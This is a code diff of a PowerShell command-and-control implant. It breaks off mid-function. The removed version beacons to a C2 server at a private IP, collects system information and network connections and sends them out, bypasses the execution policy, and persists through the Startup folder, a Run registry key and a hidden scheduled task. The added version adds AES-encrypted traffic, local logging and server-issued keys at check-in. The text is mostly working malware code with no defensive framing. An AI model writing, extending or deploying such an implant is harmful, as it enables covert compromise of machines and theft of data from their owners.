@@ -1,102 +1,104 @@
-# Advanced Windows Payload Script
-$C2Server = "http://10.0.2.4:8000"  # Replace with the IP address and port of your C2 server
-$AgentID = ""
+$LogDir = "C:\c2_Log"
+$LogFile = "$LogDir\logfile.txt"
+$AgentIDFile = "$LogDir\AgentID.txt"
+
+Function Log-Message {
+    param (
+        [string]$Message
+    )
+    if (-not (Test-Path -Path $LogDir)) {
+        New-Item -Path $LogDir -ItemType Directory
+    }
+    $Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+    $LogEntry = "$Timestamp - $Message"
+    Add-Content -Path $LogFile -Value $LogEntry
+}
+
+Function Get-EncryptionKey {
+    param ([string]$Base64Key)
+    Log-Message "Getting encryption key from Base64 string: $Base64Key"
+
+    try {
+        $KeyBytes = [System.Convert]::FromBase64String($Base64Key)
+    } catch {
+        Log-Message "Error converting Base64 string to byte array: $_"
+        throw "Invalid key format."
+    }
+
+    if ($KeyBytes.Length -ne 16 -and $KeyBytes.Length -ne 32) {
+        throw "Invalid key size. Expected 128-bit (16 bytes) or 256-bit (32 bytes)."
+    }
+    Log-Message "Encryption key obtained successfully."
+    return $KeyBytes
+}
 
 Function Encrypt-Data {
     param (
-        [string]$Data
+        [string]$Data,
+        [byte[]]$Key
     )
-    return [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Data))
+    try {
+        Log-Message "Starting encryption..."
+        $Aes = [System.Security.Cryptography.AesManaged]::new()
+        $Aes.Key = $Key
+        $Aes.GenerateIV()
+        $Encryptor = $Aes.CreateEncryptor($Aes.Key, $Aes.IV)
+
+        $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
+        $EncryptedBytes = $Encryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length)
+
+        Log-Message "Data encrypted successfully."
+        return $Aes.IV + $EncryptedBytes  # Raw binary output
+    } catch {
+        Log-Message "Error in Encrypt-Data: $_"
+        throw
+    }
 }
 
 Function Decrypt-Data {
     param (
-        [string]$Data
+        [byte[]]$Data,
+        [byte[]]$Key
     )
-    return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Data))
-}
+    try {
+        Log-Message "Starting decryption..."
+        $Aes = [System.Security.Cryptography.AesManaged]::new()
+        $Aes.Key = $Key
+        $IV = $Data[0..15]
+        $EncryptedBytes = $Data[16..($Data.Length - 1)]
 
-Function Write-Log {
-    param (
-        [string]$Message,
-        [string]$Color = "White"
-    )
-    Write-Host $Message -ForegroundColor $Color
-}
+        $Decryptor = $Aes.CreateDecryptor($Aes.Key, $IV)
+        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
 
-Function Send-Data {
-    param (
-        [string]$Endpoint,
-        [hashtable]$Data
-    )
-    $DataJson = $Data | ConvertTo-Json
-    $EncryptedData = Encrypt-Data $DataJson
-    $Url = "$C2Server/$Endpoint"
-    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
-    Write-Log "Data sent to $Endpoint"
-    return $Response
+        Log-Message "Data decrypted successfully."
+        return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
+    } catch {
+        Log-Message "Error in Decrypt-Data: $_"
+        throw
+    }
 }
 
 Function Check-In {
-    Write-Log "Checking in..."
-    $Response = Invoke-RestMethod -Uri "$C2Server/checkin" -Method Post -Body (@{AgentID=""} | ConvertTo-Json) -ContentType "application/json"
-    $AgentID = ($Response | ConvertFrom-Json).AgentID
-    Write-Log "Checked in with AgentID: $AgentID" "Cyan"
-}
+    param (
+        [string]$ServerURL,
+        [string]$AgentID,
+        [byte[]]$Key
+    )
+    try {
+        Log-Message "Starting check-in process..."
+        $Body = @{ AgentID = $AgentID } | ConvertTo-Json
+        Log-Message "Sending check-in request to $ServerURL"
+        $Response = Invoke-RestMethod -Uri "$ServerURL/checkin" -Method Post -Body $Body -ContentType "application/json"
+        Log-Message "Received check-in response: $($Response | ConvertTo-Json -Depth 100)"
 
-Function Gather-System-Info {
-    Write-Log "Gathering system info..."
-    Get-ComputerInfo | Out-String
-}
+        if ($null -eq $Response.key -or [string]::IsNullOrEmpty($Response.key)) {
+            throw "Received empty HexKey from server."
+        }
 
-Function List-Network-Connections {
-    Write-Log "Listing network connections..."
-    netstat -an | Out-String
-}
+        $Base64Key = $Response.key
+        Log-Message "Received Base64Key: $Base64Key"
 
-Function Establish-Persistence {
-    Write-Log "Establishing persistence..."
-    $ScriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_payload.ps1"
-    Copy-Item -Path "$MyInvocation.MyCommand.Path" -Destination $ScriptPath
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsPayload" -Value $ScriptPath
-}
+        $Key = Get-EncryptionKey -Base64Key $Base64Key
+        Log-Message "Encryption key obtained."
 
-Function Check-ExecutionPolicy {
-    $CurrentPolicy = Get-ExecutionPolicy
-    if ($CurrentPolicy -ne 'Unrestricted' -and $CurrentPolicy -ne 'Bypass') {
-        Write-Log "Execution policy is restricted: $CurrentPolicy. Attempting to bypass..."
-        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-    }
-}
-
-Function Create-Scheduled-Task {
-    Write-Log "Creating scheduled task..."
-    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File $MyInvocation.MyCommand.Path"
-    $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
-    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -StartWhenAvailable
-    Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -TaskName "ImmediateWindowsPayload" -Description "Runs the payload immediately"
-}
-
-Function Main {
-    Write-Log "Payload started."
-    
-    Check-ExecutionPolicy
-    Check-In
-    $SystemInfo = Gather-System-Info
-    $NetworkConnections = List-Network-Connections
-    
-    $Data = @{
-        AgentID = $AgentID
-        SystemInfo = $SystemInfo
-        NetworkConnections = $NetworkConnections
-    }
-    
-    Write-Log "Sending system info and network connections to server."
-    $Response = Send-Data "result" $Data
-    Write-Log "Response from server: $Response" "Green"
-    Establish-Persistence
-}
-
-Main
-Create-Scheduled-Task
-
+        return $Key, $Response
